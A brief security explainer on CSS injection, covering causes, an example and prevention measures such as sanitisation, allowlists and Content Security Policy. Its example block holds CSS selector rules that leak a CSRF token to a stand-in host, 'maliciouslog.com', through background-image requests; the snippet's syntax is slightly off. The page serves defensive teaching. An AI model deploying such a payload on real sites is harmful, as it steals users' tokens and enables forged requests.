# CSS Injection

## What is CSS Injection
CSS Injection occurs when arbitrary CSS code is injected into a trusted website, which is then rendered in the victim's browser.\
This allows an attacker to make UI redressing or phishing attacks against users of the application.\

## What causes CSS Injection
It can occur wherever the application allows user-generated CSS to be supplied or where stylesheets can be interfered with.

## Example
If an application lets users change the look of the site using CSS, an adversary may inject a CSS payload, which functions as a logger.\
This payload includes separate snippets for each possible variation of the required CSRF token.\

```
Input [name=csrf_token] [value=^rZHCnSzEp8dbI6atzagGoSYJkrPTz4om] {
     background-image: url(http://maliciouslog.com/log?rZHCnSzEp8dbI6atzagGoSYJkrPTz4om) :
}
Input [name=csrf_token] [value=^rZHCnSzEp8dbI6atzagGoSYJkrPTz4on] {
     background-image: url(http://maliciouslog.com/log?rZHCnSzEp8dbI6atzagGoSYJkrPTz4on) :
}
...
```

When the CSRF token matches any of the snippets included in the payload, the input tag will set the background image to a malicious URL.\
The adversary will see the request on the server, see the currently valid CSRF token and use it for other malicious activities.

## How to prevent CSS Injection
- Utilize context-dependent sanitization.
- Consider using an allowlist to prevent attackers from loading arbitrary style sheets.
- Reduce risk by not allowing users to customize the style of their personal pages with CSS.
- Implement a Content Security Policy that restricts where images and stylesheets can be loaded from.
- Sanitize for HTML tags such as style.
